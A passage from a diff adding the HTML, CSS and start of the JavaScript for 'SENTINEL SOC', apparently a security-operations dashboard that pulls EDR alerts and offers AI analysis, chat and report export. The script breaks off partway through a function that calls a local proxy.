@@ -1,0 +1,2045 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SENTINEL SOC — Cybersecurity Assistant</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg0: #07090f;
+  --bg1: #0b0e17;
+  --bg2: #0f1320;
+  --bg3: #151b2e;
+  --bg4: #1c2438;
+  --bg5: #222d47;
+  --border: rgba(255,255,255,0.07);
+  --border2: rgba(255,255,255,0.12);
+  --text0: #f0f4ff;
+  --text1: #a8b8d8;
+  --text2: #6b80a8;
+  --text3: #3d4f70;
+  --cyan: #00e5ff;
+  --cyan2: #00bcd4;
+  --green: #00e676;
+  --green2: #00c853;
+  --red: #ff1744;
+  --red2: #d50000;
+  --orange: #ff6d00;
+  --orange2: #ff9100;
+  --yellow: #ffd600;
+  --purple: #d500f9;
+  --blue: #2979ff;
+  --mono: 'IBM Plex Mono', monospace;
+  --sans: 'Syne', sans-serif;
+  --radius: 6px;
+  --shadow: 0 4px 24px rgba(0,0,0,0.5);
+}
+
+html, body { height: 100%; overflow: hidden; }
+
+body {
+  background: var(--bg0);
+  color: var(--text0);
+  font-family: var(--sans);
+  font-size: 13px;
+  display: flex;
+  flex-direction: column;
+}
+
+/* ─── TOPBAR ─── */
+#topbar {
+  height: 48px;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  padding: 0 18px;
+  gap: 20px;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 100;
+}
+#topbar::after {
+  content:'';
+  position:absolute;
+  bottom:0; left:0; right:0;
+  height:1px;
+  background: linear-gradient(90deg, transparent 0%, var(--cyan) 40%, var(--blue) 60%, transparent 100%);
+  opacity:.3;
+}
+.brand {
+  display: flex; align-items: center; gap: 10px;
+  text-decoration: none;
+}
+.brand-shield {
+  width:30px; height:30px;
+  background: linear-gradient(135deg, var(--cyan), var(--blue));
+  clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+  display:flex; align-items:center; justify-content:center;
+  font-size:13px;
+  box-shadow: 0 0 14px rgba(0,229,255,.35);
+}
+.brand-name {
+  font-family: var(--sans);
+  font-weight: 800;
+  font-size: 17px;
+  letter-spacing: 3px;
+  color: var(--text0);
+}
+.brand-name em { color: var(--cyan); font-style:normal; }
+.brand-tag {
+  font-family: var(--mono);
+  font-size: 9px;
+  color: var(--text3);
+  letter-spacing: 2px;
+  border: 1px solid var(--border2);
+  padding: 2px 7px;
+  border-radius: 3px;
+}
+.topbar-spacer { flex:1; }
+.pill {
+  display:flex; align-items:center; gap:6px;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  padding: 4px 11px;
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--text2);
+}
+.pill-dot {
+  width:6px; height:6px;
+  border-radius:50%;
+  background: var(--text3);
+  transition: background .3s, box-shadow .3s;
+}
+.pill-dot.live { background: var(--green); box-shadow: 0 0 6px var(--green); animation: livepulse 2s infinite; }
+.pill-dot.warn { background: var(--orange); box-shadow: 0 0 6px var(--orange); }
+.pill-dot.err  { background: var(--red);    box-shadow: 0 0 6px var(--red); }
+@keyframes livepulse { 0%,100%{opacity:1} 50%{opacity:.5} }
+#topbar-clock { font-family:var(--mono); font-size:10px; color:var(--text3); min-width:170px; text-align:right; }
+
+/* ─── LAYOUT ─── */
+#app {
+  display: grid;
+  grid-template-columns: 270px 1fr 300px;
+  flex: 1;
+  overflow: hidden;
+  min-height: 0;
+}
+
+/* ─── PANELS ─── */
+.panel {
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  border-right: 1px solid var(--border);
+}
+.panel:last-child { border-right: none; border-left: 1px solid var(--border); }
+.panel-hd {
+  padding: 11px 14px;
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: space-between;
+  flex-shrink: 0;
+  background: var(--bg1);
+}
+.panel-title {
+  font-family: var(--mono);
+  font-size: 9px;
+  font-weight: 600;
+  letter-spacing: 2.5px;
+  color: var(--text2);
+  text-transform: uppercase;
+}
+.panel-body {
+  flex: 1;
+  overflow-y: auto;
+  overflow-x: hidden;
+}
+.panel-body::-webkit-scrollbar { width: 3px; }
+.panel-body::-webkit-scrollbar-thumb { background: var(--bg5); border-radius: 2px; }
+
+/* ─── LEFT: CONFIG ─── */
+.cfg-block {
+  padding: 12px 14px;
+  border-bottom: 1px solid var(--border);
+}
+.cfg-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  font-weight: 600;
+  letter-spacing: 2px;
+  color: var(--text3);
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+.cfg-select, .cfg-input {
+  width: 100%;
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: var(--radius);
+  color: var(--text0);
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 7px 10px;
+  outline: none;
+  transition: border-color .2s, box-shadow .2s;
+}
+.cfg-select:focus, .cfg-input:focus {
+  border-color: var(--cyan);
+  box-shadow: 0 0 0 2px rgba(0,229,255,.1);
+}
+.cfg-select option { background: var(--bg3); }
+.cfg-input::placeholder { color: var(--text3); }
+.cfg-input[type="password"] { letter-spacing: 1px; }
+
+/* ─── BUTTONS ─── */
+.btn {
+  display: inline-flex; align-items:center; justify-content:center; gap:6px;
+  padding: 8px 14px;
+  border: none; border-radius: var(--radius);
+  font-family: var(--mono); font-size: 11px; font-weight: 600;
+  letter-spacing: .5px;
+  cursor: pointer;
+  transition: all .2s;
+  white-space: nowrap;
+}
+.btn:disabled { opacity: .4; cursor: not-allowed; }
+.btn-w { width: 100%; }
+.btn-cyan { background: var(--cyan); color: #000; }
+.btn-cyan:not(:disabled):hover { background:#33eeff; box-shadow: 0 0 16px rgba(0,229,255,.4); }
+.btn-ghost { background: var(--bg4); color: var(--text1); border: 1px solid var(--border2); }
+.btn-ghost:not(:disabled):hover { border-color: var(--cyan); color: var(--cyan); }
+.btn-green { background: var(--green); color: #000; }
+.btn-green:not(:disabled):hover { background: #33ff88; box-shadow: 0 0 16px rgba(0,230,118,.4); }
+.btn-red { background: rgba(255,23,68,.15); color: var(--red); border: 1px solid rgba(255,23,68,.3); }
+.btn-red:not(:disabled):hover { background: rgba(255,23,68,.25); }
+.btn-sm { padding: 4px 10px; font-size: 10px; }
+
+/* ─── CONNECTION TEST RESULT ─── */
+#conn-result {
+  margin: 0 14px 10px;
+  border-radius: var(--radius);
+  overflow: hidden;
+  border: 1px solid var(--border2);
+  display: none;
+}
+.conn-hd {
+  padding: 8px 12px;
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  display: flex; align-items: center; gap: 8px;
+}
+.conn-hd.ok  { background: rgba(0,230,118,.1); color: var(--green); border-bottom: 1px solid rgba(0,230,118,.2); }
+.conn-hd.bad { background: rgba(255,23,68,.1);  color: var(--red);   border-bottom: 1px solid rgba(255,23,68,.2); }
+.conn-hd.run { background: rgba(0,229,255,.07); color: var(--cyan);  border-bottom: 1px solid rgba(0,229,255,.15); }
+.conn-body { background: var(--bg3); padding: 10px 12px; }
+.conn-step {
+  display: flex; align-items: center; gap: 8px;
+  font-family: var(--mono); font-size: 10px;
+  color: var(--text3); padding: 3px 0;
+  transition: color .3s;
+}
+.conn-step.s-active { color: var(--cyan); }
+.conn-step.s-ok  { color: var(--green); }
+.conn-step.s-err { color: var(--red); }
+.spin {
+  width:9px; height:9px;
+  border: 1.5px solid var(--border2);
+  border-top-color: var(--cyan);
+  border-radius:50%;
+  animation: spin .6s linear infinite;
+  flex-shrink:0;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+.conn-meta { margin-top:8px; padding-top:8px; border-top:1px solid var(--border); display:flex; flex-direction:column; gap:4px; }
+.conn-row { display:flex; justify-content:space-between; align-items:center; font-family:var(--mono); font-size:10px; }
+.conn-k { color:var(--text3); }
+.conn-v { color:var(--text0); }
+.conn-v.ok { color:var(--green); }
+.conn-v.warn { color:var(--orange); }
+.scope-tags { display:flex; flex-wrap:wrap; gap:3px; margin-top:3px; }
+.scope-tag { font-family:var(--mono); font-size:9px; padding:1px 6px; border-radius:3px; background:rgba(41,121,255,.12); border:1px solid rgba(41,121,255,.25); color:var(--blue); }
+
+/* ─── ALERT LIST ─── */
+.al-filters {
+  display: flex; gap: 4px;
+  padding: 8px 10px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg1);
+  flex-shrink: 0;
+}
+.al-filter {
+  font-family: var(--mono); font-size: 9px; font-weight:600;
+  padding: 3px 8px; border-radius: 3px; border: none; cursor: pointer;
+  letter-spacing:.5px; transition: all .2s;
+}
+.al-filter.f-all { background:var(--bg4); color:var(--text1); }
+.al-filter.f-crit { background:rgba(255,23,68,.12); color:var(--red); }
+.al-filter.f-high { background:rgba(255,109,0,.12); color:var(--orange); }
+.al-filter.f-med  { background:rgba(255,214,0,.12); color:var(--yellow); }
+.al-filter.f-low  { background:rgba(0,230,118,.12); color:var(--green); }
+.al-filter.active { opacity:1; box-shadow:0 0 0 1px currentColor; }
+.al-filter:not(.active) { opacity:.55; }
+
+#alert-list-body { padding: 6px; }
+.al-item {
+  padding: 10px 11px;
+  border-radius: var(--radius);
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  margin-bottom: 5px;
+  cursor: pointer;
+  transition: border-color .15s, background .15s;
+  position: relative;
+  overflow: hidden;
+}
+.al-item::before {
+  content:''; position:absolute;
+  left:0; top:0; bottom:0; width:2px;
+}
+.al-item[data-sev="CRITICAL"]::before { background:var(--red); }
+.al-item[data-sev="HIGH"]::before     { background:var(--orange); }
+.al-item[data-sev="MEDIUM"]::before   { background:var(--yellow); }
+.al-item[data-sev="LOW"]::before      { background:var(--green); }
+.al-item:hover, .al-item.selected { border-color:var(--cyan); background:var(--bg3); }
+.al-item.selected::after {
+  content:''; position:absolute;
+  inset:0; background: rgba(0,229,255,.03);
+  pointer-events:none;
+}
+.al-row1 { display:flex; align-items:center; justify-content:space-between; margin-bottom:4px; gap:6px; }
+.sev-badge {
+  font-family:var(--mono); font-size:8px; font-weight:700;
+  padding:2px 6px; border-radius:3px; letter-spacing:.5px;
+  flex-shrink:0;
+}
+.sev-CRITICAL { background:rgba(255,23,68,.15); color:var(--red); }
+.sev-HIGH     { background:rgba(255,109,0,.15); color:var(--orange2); }
+.sev-MEDIUM   { background:rgba(255,214,0,.15); color:var(--yellow); }
+.sev-LOW      { background:rgba(0,230,118,.15); color:var(--green); }
+.al-time { font-family:var(--mono); font-size:9px; color:var(--text3); white-space:nowrap; }
+.al-title { font-size:12px; font-weight:600; color:var(--text0); margin-bottom:3px; line-height:1.3; }
+.al-meta { font-family:var(--mono); font-size:10px; color:var(--text2); display:flex; gap:10px; }
+
+/* ─── CENTER: DETAIL ─── */
+#detail-wrap { padding:20px; }
+.detail-placeholder {
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  height:100%; padding:40px; text-align:center; gap:12px;
+}
+.detail-placeholder .ph-icon { font-size:42px; opacity:.25; }
+.detail-placeholder .ph-title { font-size:16px; font-weight:700; color:var(--text2); }
+.detail-placeholder .ph-sub { font-size:12px; color:var(--text3); line-height:1.6; max-width:320px; }
+.d-hd { margin-bottom:16px; }
+.d-title { font-size:18px; font-weight:700; line-height:1.3; color:var(--text0); margin-bottom:8px; }
+.d-chips { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:10px; }
+.chip {
+  display:inline-flex; align-items:center; gap:5px;
+  font-family:var(--mono); font-size:10px;
+  padding:3px 9px; border-radius:20px;
+  background:var(--bg3); border:1px solid var(--border2);
+  color:var(--text1);
+}
+.info-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:16px; }
+.info-card {
+  background:var(--bg2); border:1px solid var(--border);
+  border-radius:var(--radius); padding:11px;
+}
+.info-card.full { grid-column:1/-1; }
+.info-card-lbl { font-family:var(--mono); font-size:9px; color:var(--text3); letter-spacing:2px; text-transform:uppercase; margin-bottom:6px; }
+.info-card-val { font-family:var(--mono); font-size:11px; color:var(--text0); word-break:break-all; line-height:1.5; }
+.info-card-val.cyan { color:var(--cyan); }
+.ioc-tag {
+  display:inline-block; font-family:var(--mono); font-size:10px;
+  padding:2px 8px; border-radius:3px; margin:2px;
+  background:rgba(255,109,0,.09); border:1px solid rgba(255,109,0,.2); color:var(--orange2);
+}
+.section-hd {
+  font-family:var(--mono); font-size:9px; color:var(--cyan);
+  letter-spacing:2.5px; text-transform:uppercase;
+  margin-bottom:10px; padding-bottom:6px;
+  border-bottom:1px solid rgba(0,229,255,.15);
+  display:flex; align-items:center; gap:8px;
+}
+.ai-box {
+  background:var(--bg2); border:1px solid var(--border);
+  border-radius:var(--radius); padding:16px;
+  font-size:13px; line-height:1.75; color:var(--text1);
+  margin-bottom:16px;
+}
+.ai-box h3 { color:var(--cyan); font-size:12px; font-weight:700; margin:14px 0 6px; font-family:var(--mono); letter-spacing:.5px; }
+.ai-box h3:first-child { margin-top:0; }
+.ai-box p { margin-bottom:8px; color:var(--text1); }
+.ai-box p:last-child { margin-bottom:0; }
+.ai-box strong { color:var(--text0); font-weight:600; }
+.ai-box code { font-family:var(--mono); font-size:11px; background:var(--bg4); padding:1px 6px; border-radius:3px; color:#c792ea; }
+.ai-box ul { padding-left:18px; margin:6px 0 10px; }
+.ai-box li { margin-bottom:5px; color:var(--text1); }
+.ai-box .cmd {
+  font-family:var(--mono); font-size:11px;
+  background:#000; border:1px solid var(--border2);
+  border-radius:var(--radius); padding:8px 12px;
+  color:var(--green); margin:6px 0;
+  display:block; position:relative;
+}
+.ai-box .cmd::before { content:'$ '; color:var(--text3); }
+.mitre-pill {
+  display:inline-block; font-family:var(--mono); font-size:10px; font-weight:700;
+  padding:2px 8px; border-radius:3px; margin:2px;
+  background:rgba(213,0,249,.12); border:1px solid rgba(213,0,249,.25); color:var(--purple);
+}
+.thinking {
+  display:flex; align-items:center; gap:10px;
+  color:var(--text2); font-family:var(--mono); font-size:11px; padding:12px 0;
+}
+.thinking-dots span {
+  display:inline-block; width:5px; height:5px;
+  background:var(--cyan); border-radius:50%;
+  animation:blink 1.1s infinite; margin-right:3px;
+}
+.thinking-dots span:nth-child(2){animation-delay:.18s}
+.thinking-dots span:nth-child(3){animation-delay:.36s}
+@keyframes blink{0%,80%,100%{opacity:.15;transform:scale(.8)}40%{opacity:1;transform:scale(1.1)}}
+
+/* ─── RIGHT TABS ─── */
+.rtabs { display:flex; border-bottom:1px solid var(--border); flex-shrink:0; }
+.rtab {
+  flex:1; padding:11px 6px;
+  background:none; border:none; border-bottom:2px solid transparent;
+  color:var(--text3); font-family:var(--mono); font-size:9px;
+  letter-spacing:1.5px; text-transform:uppercase;
+  cursor:pointer; transition:all .2s;
+}
+.rtab.active { color:var(--cyan); border-bottom-color:var(--cyan); background:rgba(0,229,255,.04); }
+.rtab:not(.active):hover { color:var(--text1); }
+.tab-panel { display:none; flex-direction:column; height:100%; overflow:hidden; }
+.tab-panel.active { display:flex; }
+
+/* ─── CHAT ─── */
+#chat-msgs {
+  flex:1; overflow-y:auto; padding:12px;
+  display:flex; flex-direction:column; gap:10px;
+}
+#chat-msgs::-webkit-scrollbar { width:3px; }
+#chat-msgs::-webkit-scrollbar-thumb { background:var(--bg5); }
+.msg { display:flex; flex-direction:column; gap:3px; }
+.msg-who { font-family:var(--mono); font-size:9px; letter-spacing:1px; color:var(--text3); }
+.msg-who.ai { color:var(--cyan); }
+.msg-body {
+  background:var(--bg3); border:1px solid var(--border);
+  border-radius:var(--radius); padding:9px 11px;
+  font-size:12px; line-height:1.65; color:var(--text1);
+}
+.msg.user .msg-body {
+  background:rgba(0,229,255,.07); border-color:rgba(0,229,255,.18);
+  margin-left:16px;
+}
+.msg.assistant .msg-body { margin-right:16px; }
+.msg-body strong { color:var(--text0); }
+.msg-body code { font-family:var(--mono); font-size:10px; background:var(--bg4); padding:1px 5px; border-radius:3px; color:#c792ea; }
+.msg-body ul { padding-left:15px; margin:5px 0; }
+.msg-body li { margin-bottom:3px; }
+.chat-input-row {
+  border-top:1px solid var(--border); padding:10px;
+  display:flex; gap:7px; flex-shrink:0;
+}
+#chat-input {
+  flex:1; background:var(--bg3); border:1px solid var(--border2);
+  border-radius:var(--radius); padding:8px 11px;
+  color:var(--text0); font-family:var(--mono); font-size:11px;
+  outline:none; resize:none; height:56px;
+  transition:border-color .2s;
+}
+#chat-input:focus { border-color:var(--cyan); }
+#chat-input::placeholder { color:var(--text3); }
+#chat-send {
+  width:36px; height:36px; align-self:flex-end;
+  background:var(--cyan); border:none; border-radius:var(--radius);
+  color:#000; font-size:14px; cursor:pointer; transition:all .2s;
+  display:flex; align-items:center; justify-content:center;
+}
+#chat-send:not(:disabled):hover { background:#33eeff; box-shadow:0 0 12px rgba(0,229,255,.4); }
+#chat-send:disabled { opacity:.4; cursor:not-allowed; }
+
+/* ─── STATS ─── */
+#stats-panel { overflow-y:auto; padding:14px; }
+#stats-panel::-webkit-scrollbar { width:3px; }
+.stat-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-bottom:14px; }
+.stat-card {
+  background:var(--bg2); border:1px solid var(--border);
+  border-radius:var(--radius); padding:12px 11px; text-align:center;
+}
+.stat-n { font-family:var(--mono); font-size:26px; font-weight:700; display:block; margin-bottom:2px; }
+.stat-l { font-family:var(--mono); font-size:9px; color:var(--text3); letter-spacing:2px; text-transform:uppercase; }
+.stat-card.sc-crit .stat-n { color:var(--red); }
+.stat-card.sc-high .stat-n { color:var(--orange2); }
+.stat-card.sc-med  .stat-n { color:var(--yellow); }
+.stat-card.sc-low  .stat-n { color:var(--green); }
+.stat-block { margin-bottom:14px; }
+.stat-block-title { font-family:var(--mono); font-size:9px; color:var(--text3); letter-spacing:2px; text-transform:uppercase; margin-bottom:8px; }
+.ep-row { display:flex; align-items:center; justify-content:space-between; padding:5px 0; border-bottom:1px solid var(--border); font-family:var(--mono); font-size:10px; }
+.ep-name { color:var(--text1); }
+.ep-count { background:var(--bg4); border:1px solid var(--border2); border-radius:3px; padding:1px 6px; color:var(--cyan); }
+
+/* ─── REPORT ─── */
+#report-panel { overflow-y:auto; padding:14px; display:flex; flex-direction:column; gap:10px; }
+#report-panel::-webkit-scrollbar { width:3px; }
+#report-output {
+  background:var(--bg2); border:1px solid var(--border);
+  border-radius:var(--radius); padding:14px;
+  font-size:11px; line-height:1.7; color:var(--text1);
+  max-height:380px; overflow-y:auto;
+  font-family:var(--mono);
+  display:none;
+}
+#report-output::-webkit-scrollbar { width:3px; }
+#report-output h2 { color:var(--cyan); font-family:var(--sans); font-size:13px; margin-bottom:8px; padding-bottom:4px; border-bottom:1px solid rgba(0,229,255,.2); }
+#report-output h3 { color:var(--text0); font-size:11px; margin:10px 0 5px; font-family:var(--sans); }
+#report-output p  { margin-bottom:6px; color:var(--text2); }
+#report-output ul { padding-left:14px; }
+#report-output li { color:var(--text2); margin-bottom:3px; }
+#report-output .r-crit { color:var(--red); }
+#report-output .r-high { color:var(--orange2); }
+#report-output .r-ok   { color:var(--green); }
+.dl-btns { display:flex; gap:6px; flex-wrap:wrap; }
+
+/* ─── TOAST ─── */
+#toast {
+  position:fixed; bottom:18px; right:18px; z-index:9999;
+  background:var(--bg3); border:1px solid var(--border2);
+  border-radius:var(--radius); padding:9px 14px;
+  font-family:var(--mono); font-size:11px; color:var(--text0);
+  display:flex; align-items:center; gap:8px;
+  opacity:0; transform:translateY(8px);
+  transition:all .25s; pointer-events:none;
+  max-width:300px; box-shadow:var(--shadow);
+}
+#toast.show { opacity:1; transform:translateY(0); }
+#toast.t-ok  { border-color:rgba(0,230,118,.4); }
+#toast.t-err { border-color:rgba(255,23,68,.4); }
+#toast.t-info { border-color:rgba(0,229,255,.3); }
+
+/* ─── MONITOR BADGE ─── */
+.mon-badge {
+  display:inline-flex; align-items:center; gap:4px;
+  font-family:var(--mono); font-size:9px;
+  padding:2px 7px; border-radius:3px;
+  background:rgba(0,230,118,.1); border:1px solid rgba(0,230,118,.2);
+  color:var(--green);
+}
+.empty-list {
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  padding:40px 20px; gap:8px; color:var(--text3); text-align:center;
+}
+.empty-list .ei { font-size:28px; opacity:.3; }
+.empty-list p { font-size:11px; line-height:1.6; font-family:var(--mono); }
+</style>
+</head>
+<body>
+
+<!-- TOPBAR -->
+<div id="topbar">
+  <div class="brand">
+    <div class="brand-shield">🛡</div>
+    <span class="brand-name">SENTI<em>NEL</em></span>
+  </div>
+  <span class="brand-tag">SOC ASSISTANT</span>
+  <div class="topbar-spacer"></div>
+  <div class="pill" id="pill-mon">
+    <div class="pill-dot" id="mon-dot"></div>
+    <span id="mon-label">STANDBY</span>
+  </div>
+  <div class="pill" id="pill-edr">
+    <div class="pill-dot" id="edr-dot"></div>
+    <span id="edr-label">EDR: —</span>
+  </div>
+  <div class="pill">
+    <span>🔄</span>
+    <span id="last-fetch">Never fetched</span>
+  </div>
+  <div class="pill" id="pill-proxy" style="cursor:pointer" onclick="detectProxy()" title="Click to recheck proxy">
+    <div class="pill-dot" id="proxy-dot"></div>
+    <span id="proxy-status">Proxy: checking…</span>
+  </div>
+  <div id="topbar-clock"></div>
+</div>
+
+<!-- APP -->
+<div id="app">
+
+  <!-- ── LEFT: CONFIG + ALERTS ── -->
+  <div class="panel" id="left-panel">
+    <div class="panel-hd">
+      <span class="panel-title">⚙ Configuration</span>
+    </div>
+    <div class="panel-body" id="left-body">
+
+      <!-- EDR SELECT -->
+      <div class="cfg-block">
+        <div class="cfg-label">EDR Platform</div>
+        <select class="cfg-select" id="cfg-platform" onchange="onPlatformChange()">
+          <option value="demo">🎭 Demo Mode (built-in data)</option>
+          <option value="crowdstrike">🦅 CrowdStrike Falcon</option>
+          <option value="sentinelone">🔵 SentinelOne</option>
+          <option value="defender">🛡 Microsoft Defender for Endpoint</option>
+          <option value="carbonblack">⚫ VMware Carbon Black</option>
+        </select>
+      </div>
+
+      <!-- EDR CREDENTIALS (hidden in demo) -->
+      <div id="cred-block" class="cfg-block" style="display:none">
+        <div id="cred-fields"></div>
+      </div>
+
+      <!-- POLLING INTERVAL -->
+      <div class="cfg-block">
+        <div class="cfg-label">Monitoring Interval</div>
+        <select class="cfg-select" id="cfg-interval">
+          <option value="30">Every 30 seconds</option>
+          <option value="60" selected>Every 1 minute</option>
+          <option value="300">Every 5 minutes</option>
+          <option value="600">Every 10 minutes</option>
+        </select>
+      </div>
+
+      <!-- LOOKBACK -->
+      <div class="cfg-block">
+        <div class="cfg-label">Fetch Alerts From</div>
+        <select class="cfg-select" id="cfg-lookback">
+          <option value="1">Last 24 hours</option>
+          <option value="3">Last 3 days</option>
+          <option value="7" selected>Last 7 days (1 week)</option>
+          <option value="14">Last 14 days</option>
+          <option value="30">Last 30 days</option>
+        </select>
+      </div>
+
+      <!-- ACTION BUTTONS -->
+      <div class="cfg-block" style="display:flex;flex-direction:column;gap:7px">
+        <button class="btn btn-ghost btn-w" id="btn-test" onclick="testConnection()">🔌 Test Connection</button>
+        <div id="conn-result"></div>
+        <button class="btn btn-cyan btn-w" id="btn-start" onclick="startMonitoring()" disabled>▶ Start Monitoring</button>
+        <button class="btn btn-ghost btn-w" id="btn-fetch" onclick="fetchNow()" style="display:none">⟳ Fetch Now</button>
+        <button class="btn btn-red btn-w" id="btn-stop" onclick="stopMonitoring()" style="display:none">⏹ Stop</button>
+      </div>
+
+      <!-- ALERTS HEADER -->
+      <div class="panel-hd" style="border-top:1px solid var(--border)">
+        <span class="panel-title">⚠ Alerts <span id="alert-badge" style="color:var(--cyan)"></span></span>
+        <div style="display:flex;gap:5px">
+          <span id="mon-badge-el" style="display:none" class="mon-badge"><span class="pill-dot live"></span>LIVE</span>
+          <button class="btn btn-red btn-sm" onclick="clearAlerts()">Clear</button>
+        </div>
+      </div>
+
+      <!-- FILTERS -->
+      <div class="al-filters" id="al-filters">
+        <button class="al-filter f-all active" onclick="setFilter('ALL')">ALL</button>
+        <button class="al-filter f-crit" onclick="setFilter('CRITICAL')">CRIT</button>
+        <button class="al-filter f-high" onclick="setFilter('HIGH')">HIGH</button>
+        <button class="al-filter f-med"  onclick="setFilter('MEDIUM')">MED</button>
+        <button class="al-filter f-low"  onclick="setFilter('LOW')">LOW</button>
+      </div>
+
+      <!-- ALERT LIST -->
+      <div id="alert-list-body">
+        <div class="empty-list">
+          <div class="ei">📡</div>
+          <p>Configure your EDR and<br>start monitoring to see alerts</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── CENTER: ALERT DETAIL + AI ── -->
+  <div class="panel" id="center-panel">
+    <div class="panel-hd">
+      <span class="panel-title" id="center-title">// Alert Detail & AI Analysis</span>
+      <button class="btn btn-ghost btn-sm" id="btn-reanalyze" onclick="reanalyze()" style="display:none">↻ Re-analyze</button>
+    </div>
+    <div class="panel-body">
+      <div id="detail-wrap">
+        <div class="detail-placeholder" id="detail-placeholder">
+          <div class="ph-icon">🔍</div>
+          <div class="ph-title">No Alert Selected</div>
+          <div class="ph-sub">Select an alert from the left panel to see full details and AI-powered analysis including MITRE ATT&CK mapping and response guidance.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── RIGHT: TABS ── -->
+  <div class="panel" id="right-panel">
+    <div class="rtabs">
+      <button class="rtab active" onclick="switchTab('chat')"   id="rt-chat">💬 Chat</button>
+      <button class="rtab"        onclick="switchTab('stats')"  id="rt-stats">📊 Stats</button>
+      <button class="rtab"        onclick="switchTab('report')" id="rt-report">📄 Report</button>
+    </div>
+
+    <!-- CHAT -->
+    <div class="tab-panel active" id="tp-chat">
+      <div id="chat-msgs">
+        <div class="msg assistant">
+          <div class="msg-who ai">🛡 SENTINEL AI</div>
+          <div class="msg-body">
+            Hello. I'm your SOC assistant. I can:<br>
+            <ul>
+              <li>Explain any alert in plain language</li>
+              <li>Map activity to <strong>MITRE ATT&CK</strong></li>
+              <li>Provide step-by-step <strong>IR guidance</strong></li>
+              <li>Answer cybersecurity questions</li>
+            </ul>
+            Select an alert or ask me anything.
+          </div>
+        </div>
+      </div>
+      <div class="chat-input-row">
+        <textarea id="chat-input" placeholder="Ask about a threat, alert, or remediation..." onkeydown="chatKey(event)"></textarea>
+        <button id="chat-send" onclick="sendChat()">➤</button>
+      </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="tab-panel" id="tp-stats">
+      <div id="stats-panel">
+        <div class="stat-block">
+          <div class="stat-block-title">Alert Severity Breakdown</div>
+          <div class="stat-grid">
+            <div class="stat-card sc-crit"><span class="stat-n" id="sc-crit">0</span><span class="stat-l">Critical</span></div>
+            <div class="stat-card sc-high"><span class="stat-n" id="sc-high">0</span><span class="stat-l">High</span></div>
+            <div class="stat-card sc-med"> <span class="stat-n" id="sc-med">0</span><span class="stat-l">Medium</span></div>
+            <div class="stat-card sc-low"> <span class="stat-n" id="sc-low">0</span><span class="stat-l">Low</span></div>
+          </div>
+        </div>
+        <div class="stat-block">
+          <div class="stat-block-title">Affected Endpoints</div>
+          <div id="ep-list"><p style="color:var(--text3);font-family:var(--mono);font-size:10px">No data yet</p></div>
+        </div>
+        <div class="stat-block">
+          <div class="stat-block-title">MITRE Techniques Observed</div>
+          <div id="mitre-list"><p style="color:var(--text3);font-family:var(--mono);font-size:10px">Analyze alerts to populate</p></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- REPORT -->
+    <div class="tab-panel" id="tp-report">
+      <div id="report-panel">
+        <div>
+          <div class="cfg-label" style="margin-bottom:6px">Report Type</div>
+          <select class="cfg-select" id="rpt-type">
+            <option value="weekly">Weekly Security Report</option>
+            <option value="incident">Incident Summary Report</option>
+            <option value="executive">Executive Briefing</option>
+            <option value="mitre">MITRE ATT&CK Coverage Report</option>
+          </select>
+        </div>
+        <button class="btn btn-cyan btn-w" id="btn-genrpt" onclick="generateReport()">⚡ Generate Report</button>
+        <div id="report-output"></div>
+        <div class="dl-btns" id="dl-btns" style="display:none">
+          <button class="btn btn-green" onclick="downloadReport('html')">⬇ HTML</button>
+          <button class="btn btn-ghost" onclick="downloadReport('md')">⬇ Markdown</button>
+          <button class="btn btn-ghost" onclick="downloadReport('txt')">⬇ Plain Text</button>
+          <button class="btn btn-ghost" onclick="downloadReport('csv')">⬇ CSV</button>
+          <button class="btn btn-ghost" onclick="downloadReport('json')">⬇ JSON</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /app -->
+
+<div id="toast"></div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════
+// PROXY DETECTION
+// ═══════════════════════════════════════════════════════════════
+const PROXY = 'http://localhost:3847';
+let proxyAvailable = false;
+
+async function detectProxy() {
+  try {
+    const r = await fetch(`${PROXY}/health`, { signal: AbortSignal.timeout(1500) });
+    proxyAvailable = r.ok;
+  } catch { proxyAvailable = false; }
+  const statusEl = document.getElementById('proxy-status');
+  const dotEl    = document.getElementById('proxy-dot');
+  if (statusEl) statusEl.textContent = proxyAvailable ? 'Proxy: Running' : 'Proxy: Offline';
+  if (dotEl)    dotEl.className = proxyAvailable ? 'pill-dot live' : 'pill-dot err';
+  return proxyAvailable;
+}
+// Auto-check on load
+detectProxy();
+
+// Call proxy endpoint — falls back to direct fetch if proxy not up
+async function proxyFetch(endpoint, body) {
+  const r = await fetch(`${PROXY}${endpoint}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  });
